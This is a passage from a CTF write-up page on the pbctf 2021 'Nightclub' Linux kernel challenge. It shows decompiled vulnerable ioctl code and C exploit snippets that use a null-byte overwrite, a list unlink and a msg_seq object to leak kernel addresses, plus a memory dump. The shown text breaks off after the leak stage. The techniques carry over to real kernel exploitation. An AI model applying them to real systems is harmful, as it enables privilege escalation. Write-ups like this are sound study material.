<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>pbctf 2021 - Nightclub | kileak</title>





<meta name="description" content="pbctf 2021 - Nightclub">


<meta name="keywords" content="pbctf, nightclub">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2021/pb21-nightclub/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">pbctf 2021 - Nightclub</h1>
      <p class="post-meta">Oct 11, 2021</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>Nightclub
<!--break--></p>

  <p>Description</p>

  <p>Do you like Heap-Hop ? Then show me your BHOPs</p>

  <p>nc nightclub.chal.perfect.blue 1337</p>

  <p>Attachment: <a href="https://kileak.github.io/assets/pb21/nightclub/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/pb21/nightclub/pwn.c">pwn.c</a></p>

  <p>Team: Super Guesser</p>
</blockquote>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="nf">device_ioctl</span><span class="p">(</span><span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">request</span> <span class="o">*</span><span class="n">req</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mh">0xCAFEB001</span><span class="p">:</span> <span class="k">return</span> <span class="n">add_chunk</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
        <span class="k">case</span> <span class="mh">0xCAFEB002</span><span class="p">:</span> <span class="k">return</span> <span class="n">del_chunk</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
        <span class="k">case</span> <span class="mh">0xCAFEB003</span><span class="p">:</span> <span class="k">return</span> <span class="n">edit_chunk</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
        <span class="k">case</span> <span class="mh">0xCAFEB004</span><span class="p">:</span> <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">edit_chunk</span> <span class="o">-</span> <span class="o">&amp;</span><span class="n">_kmalloc</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Nightclub was a heap note like kernel challenge, that let us add, delete and edit a chunk. It also provided a partial leak, returning the lower 32bit of the relative position from <code class="language-plaintext highlighter-rouge">edit_chunk</code> to <code class="language-plaintext highlighter-rouge">kmalloc</code>.</p>

<p>The add, delete and edit functions had those weird address checks on top</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">_kmalloc</span> <span class="o">+</span> <span class="mh">0xFFE355B0</span><span class="p">;</span>
<span class="n">kernel_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">kernel_chunk</span> <span class="o">*</span><span class="p">)</span><span class="n">kmem_cache_alloc_trace</span><span class="p">(</span><span class="n">kmalloc_caches</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="mi">3264LL</span><span class="p">,</span> <span class="mi">128LL</span><span class="p">);</span>
<span class="n">kernel_note</span> <span class="o">=</span> <span class="n">kernel_chunk</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">kernel_chunk</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">_kmalloc</span> <span class="o">+</span> <span class="mh">0xFFE355B0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">kernel_chunk</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">kernel_chunk</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&lt;=</span> <span class="mh">0x5FFFFFF</span> <span class="p">)</span>
      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">v8</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">kernel_note</span> <span class="p">)</span>
      <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
<span class="nl">LABEL_12:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">kernel_note</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0xFFFFFF</span> <span class="p">)</span>
      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">LABEL_5</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">v4</span> <span class="o">=</span> <span class="n">kernel_chunk</span><span class="p">;</span>
<span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">-</span> <span class="n">v1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x5FFFFFF</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">v8</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">kernel_note</span> <span class="p">)</span>
    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
<span class="n">LABEL_4</span><span class="o">:</span>
<span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">kernel_note</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0xFFFFFF</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span></code></pre></figure>

<p>which I just quickly interpreted as pb’s mean way to disallow us to directly edit or add a chunk over <code class="language-plaintext highlighter-rouge">modprobe_path</code>. As it turned out later, this was meant to be used for bruteforcing kernel addresses to get the needed leaks. Well, I just ignored it completely and went a different route :’)</p>

<p>Let’s check the rest of add/edit/delete</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">k_obj</span>
<span class="p">{</span>
    <span class="n">k_obj</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
    <span class="n">k_obj</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">unk1</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">unk2</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">uid</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">unk3</span><span class="p">[</span><span class="mh">0x14</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">field0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">field1</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">message</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">long</span> <span class="nf">add_chunk</span><span class="p">(</span><span class="n">request</span> <span class="o">*</span><span class="n">u_req</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">msg_size</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">msg_uid</span><span class="p">;</span>

    <span class="n">k_obj</span> <span class="o">*</span><span class="n">kobj</span> <span class="o">=</span> <span class="n">kmem_cache_alloc_trace</span><span class="p">(</span><span class="n">kmalloc_caches</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="mi">3264</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">kobj</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_chunk</span><span class="p">));</span>

    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kobj</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u_req</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg_size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u_req</span><span class="o">-&gt;</span><span class="n">msg_size</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">msg_size</span> <span class="o">&gt;</span> <span class="mh">0x20</span> <span class="o">||</span> <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">&gt;</span> <span class="mh">0x10</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">kfree</span><span class="p">(</span><span class="n">kobj</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kobj</span><span class="o">-&gt;</span><span class="n">field0</span><span class="p">,</span> <span class="n">u_req</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="n">copy_from_user</span><span class="p">(</span><span class="n">kobj</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span> <span class="n">u_req</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span> <span class="n">msg_size</span><span class="p">);</span>

        <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">[</span><span class="n">msg_size</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// OOB null byte overwrite</span>

        <span class="n">get_random_bytes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg_uid</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>

        <span class="n">k_obj</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">master_list</span><span class="p">;</span>

        <span class="n">master_list</span> <span class="o">=</span> <span class="n">kobj</span><span class="p">;</span>
        <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">=</span> <span class="n">msg_uid</span><span class="p">;</span>

        <span class="n">tmp</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">kobj</span><span class="p">;</span>
        <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
        <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">master_list</span><span class="p">;</span>

        <span class="k">return</span> <span class="n">msg_uid</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>Simply allocate a chunk and put our message into it. Though terminating our message with a null byte will lead to an oob null byte overwrite of the follow up chunks <code class="language-plaintext highlighter-rouge">next</code> ptr, if we provide a <code class="language-plaintext highlighter-rouge">msg_size</code> of <code class="language-plaintext highlighter-rouge">0x20</code> (didn’t use this, since we have the same in <code class="language-plaintext highlighter-rouge">edit_chunk</code> also).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="nf">edit_chunk</span><span class="p">(</span><span class="n">request</span> <span class="o">*</span><span class="n">u_req</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">req_uid</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">;</span>

    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req_uid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u_req</span><span class="o">-&gt;</span><span class="n">chunk_uid</span><span class="p">,</span> <span class="mi">4LL</span><span class="p">);</span>
    <span class="n">copy_from_user</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u_req</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">);</span>

    <span class="c1">// check for empty list</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">master_list</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">master_list</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="n">k_obj</span><span class="o">*</span> <span class="n">kobj</span> <span class="o">=</span> <span class="n">master_list</span><span class="p">;</span>

    <span class="c1">// find chunk with matching uid</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">kobj</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req_uid</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">kobj</span> <span class="o">=</span> <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">kobj</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">master_list</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// check size and offset</span>
    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u_req</span><span class="o">-&gt;</span><span class="n">msg_size</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x20</span> <span class="o">||</span> <span class="n">offset</span> <span class="o">&gt;</span> <span class="mh">0x10</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="c1">// copy message to kernel object</span>
    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kobj</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="n">u_req</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span> <span class="c1">// can overwrite following 0x10 bytes</span>
    
    <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">[</span><span class="n">size</span> <span class="o">+</span> <span class="n">offset</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>This is getting more useful. Though, it will check that our <code class="language-plaintext highlighter-rouge">msg_size</code> is not bigger than <code class="language-plaintext highlighter-rouge">0x20</code> and <code class="language-plaintext highlighter-rouge">offset</code> isn’t bigger than <code class="language-plaintext highlighter-rouge">0x10</code>, if we use those limits, it will allow us to overwrite <code class="language-plaintext highlighter-rouge">0x10</code> bytes of the follow up chunk (which will be <code class="language-plaintext highlighter-rouge">next</code> and <code class="language-plaintext highlighter-rouge">prev</code> pointer of the following chunk).</p>

<p>It also has the same oob NULL byte overwrite (when specifying <code class="language-plaintext highlighter-rouge">msg_size</code> <code class="language-plaintext highlighter-rouge">0x20</code> and <code class="language-plaintext highlighter-rouge">offset</code> <code class="language-plaintext highlighter-rouge">0x0</code>) as <code class="language-plaintext highlighter-rouge">add_chunk</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="nf">del_chunk</span><span class="p">(</span><span class="n">request</span> <span class="o">*</span><span class="n">u_req</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">req_uid</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">;</span>

    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req_uid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u_req</span><span class="o">-&gt;</span><span class="n">chunk_uid</span><span class="p">,</span> <span class="mi">4LL</span><span class="p">);</span>
    
    <span class="c1">// check for empty list</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">master_list</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">master_list</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="n">k_obj</span><span class="o">*</span> <span class="n">kobj</span> <span class="o">=</span> <span class="n">master_list</span><span class="p">;</span>

    <span class="c1">// find chunk with matching uid</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">kobj</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req_uid</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">kobj</span> <span class="o">=</span> <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">kobj</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">master_list</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">k_obj</span><span class="o">*</span> <span class="n">tmp_next</span> <span class="o">=</span> <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
    <span class="n">k_obj</span><span class="o">*</span> <span class="n">tmp_prev</span> <span class="o">=</span> <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>

    <span class="n">tmp_next</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">tmp_prev</span><span class="p">;</span>
    <span class="n">tmp_prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tmp_next</span><span class="p">;</span>

    <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="mh">0xDEAD000000000100</span><span class="p">;</span>
    <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="mh">0xDEAD000000000122</span><span class="p">;</span>

    <span class="n">kfree</span><span class="p">(</span><span class="n">kobj</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>This will unlink our chunk from the doubly linked list and free it.</p>

<p>Soooooo, since I totally ignored the intended way to leak kernel addresses, and <code class="language-plaintext highlighter-rouge">next</code> and <code class="language-plaintext highlighter-rouge">prev</code> pointers were overwritten in <code class="language-plaintext highlighter-rouge">del_chunk</code>, I first had to come up with a way to find some proper leaks, to do anything useful with the overwrite in <code class="language-plaintext highlighter-rouge">edit_chunk</code>.</p>

<p>Since our messages will always be null terminated, the only thing we can do without knowing exact addresses is to overwrite the LSB of the first qword in a following chunk with a null byte. Putting a <code class="language-plaintext highlighter-rouge">msg_msg</code> struct in a freed chunk will also not help us much, since freeing it, would break the message object and we wouldn’t be able to retrieve it anymore after that.</p>

<p>But… a <code class="language-plaintext highlighter-rouge">msg_seq</code> object would stay totally fine :)</p>

<p>So, for leaking, I allocated six chunks, deleted the third chunk (which will be at an address ending in a null byte) and sent a message with size <code class="language-plaintext highlighter-rouge">0xfd0+0x20+0x80</code>. This will create a <code class="language-plaintext highlighter-rouge">msg_msg</code> object with size <code class="language-plaintext highlighter-rouge">0xfd0</code> and a <code class="language-plaintext highlighter-rouge">msg_seq</code> with size <code class="language-plaintext highlighter-rouge">0x80</code>, thus landing exactly in our just freed chunk.</p>

<p>Then we can use the lsb null overwrite to overwrite the <code class="language-plaintext highlighter-rouge">next</code> pointer of the fifth chunk, making it point to the <code class="language-plaintext highlighter-rouge">msg_seq</code> object. Then we can just free that chunk, which will trigger the unlink in <code class="language-plaintext highlighter-rouge">del_chunk</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">k_obj</span><span class="o">*</span> <span class="n">tmp_next</span> <span class="o">=</span> <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>  <span class="c1">// points to our msg_seq object</span>
<span class="n">k_obj</span><span class="o">*</span> <span class="n">tmp_prev</span> <span class="o">=</span> <span class="n">kobj</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>

<span class="n">tmp_next</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">tmp_prev</span><span class="p">;</span>     <span class="c1">// writes kobj-&gt;prev to msg_seq+0x8</span>
<span class="n">tmp_prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tmp_next</span><span class="p">;</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">uid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
        
<span class="n">del_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="n">del_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="c1">// overwrite LSB of next pointer of followup chunk (uid[4]) with 0x0 pointing to freed chunk (uid[2])</span>
<span class="n">edit_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>            

<span class="c1">// allocate a msg_seq with 0x80, so it will be put into freed chunk (uid[2])</span>
<span class="n">msgalloc</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0xfd0</span><span class="o">+</span><span class="mh">0x80</span><span class="o">+</span><span class="mh">0x20</span><span class="p">);</span>

<span class="c1">// delete chunk uid[4] to trigger unlink in msg_seq</span>
<span class="n">del_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>

<span class="c1">// receive the leak from msg_seq chunk</span>
<span class="n">msgrcv</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0xfd0</span><span class="o">+</span><span class="mh">0x80</span><span class="o">+</span><span class="mh">0x20</span><span class="o">-</span><span class="mh">0x30</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kleak</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0xfd8</span><span class="p">));</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">msgbase</span> <span class="o">=</span> <span class="n">kleak</span><span class="o">-</span><span class="mh">0x280</span><span class="p">;</span></code></pre></figure>

<p>After deleting the first two chunks, memory will look like this</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888003fcf400:	0xffffffffc0002100	0xffff888003fcf580  &lt;= chunk 1 (uid[0])
0xffff888003fcf410:	0x0000000000000000	0x0000000000000000
0xffff888003fcf420:	0x0000000000000000	0x0000000000000000
0xffff888003fcf430:	0x0000000000000000	0x0000000005aa9c92
0xffff888003fcf440:	0x0000000000000000	0x0000000000000000
0xffff888003fcf450:	0x0000000000000000	0x0000000000000000
0xffff888003fcf460:	0x4141414141414141	0x4141414141414141
0xffff888003fcf470:	0x4141414141414141	0x4141414141414141
0xffff888003fcf480:	0xdead000000000100	0xdead000000000122  &lt;= freed chunk 2 (uid[1])
0xffff888003fcf490:	0x0000000000000000	0x0000000000000000
0xffff888003fcf4a0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf4b0:	0x0000000000000000	0x00000000c5438ea4
0xffff888003fcf4c0:	0xffff888003fcf700	0x0000000000000000
0xffff888003fcf4d0:	0x0000000000000001	0x0000000000000001
0xffff888003fcf4e0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf4f0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf500:	0xdead000000000100	0xdead000000000122  &lt;= freed chunk 3 (uid[2])
0xffff888003fcf510:	0x0000000000000000	0x0000000000000000
0xffff888003fcf520:	0x0000000000000000	0x0000000000000000
0xffff888003fcf530:	0x0000000000000000	0x00000000d03704e0
0xffff888003fcf540:	0xffff888003fcf480	0x0000000000000000
0xffff888003fcf550:	0x0000000000000002	0x0000000000000002
0xffff888003fcf560:	0x4141414141414141	0x4141414141414141
0xffff888003fcf570:	0x4141414141414141	0x4141414141414141
0xffff888003fcf580:	0xffff888003fcf400	0xffff888003fcf600  &lt;= chunk 4 (uid[3])
0xffff888003fcf590:	0x0000000000000000	0x0000000000000000
0xffff888003fcf5a0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf5b0:	0x0000000000000000	0x00000000fbf11440
0xffff888003fcf5c0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf5d0:	0x0000000000000003	0x0000000000000003
0xffff888003fcf5e0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf5f0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf600:	0xffff888003fcf580	0xffff888003fcf680  &lt;= chunk 5 (uid[4])
0xffff888003fcf610:	0x0000000000000000	0x0000000000000000
0xffff888003fcf620:	0x0000000000000000	0x0000000000000000
0xffff888003fcf630:	0x0000000000000000	0x0000000005c67703
0xffff888003fcf640:	0x0000000000000000	0x0000000000000000
0xffff888003fcf650:	0x0000000000000004	0x0000000000000004
0xffff888003fcf660:	0x4141414141414141	0x4141414141414141
0xffff888003fcf670:	0x4141414141414141	0x4141414141414141
0xffff888003fcf680:	0xffff888003fcf600	0xffffffffc0002100</code></pre></figure>

<p>With the null byte overwrite we changed the <code class="language-plaintext highlighter-rouge">next</code> ptr from chunk 5 from <code class="language-plaintext highlighter-rouge">0xffff888003fcf580</code> to <code class="language-plaintext highlighter-rouge">0xffff888003fcf500</code>, now pointing to the freed chunk 3 (uid[2]).</p>

<p>Allocating a message with size <code class="language-plaintext highlighter-rouge">0xfd0+0x80+0x20</code> will then put a <code class="language-plaintext highlighter-rouge">msg_seq</code> object in freed chunk 3.</p>

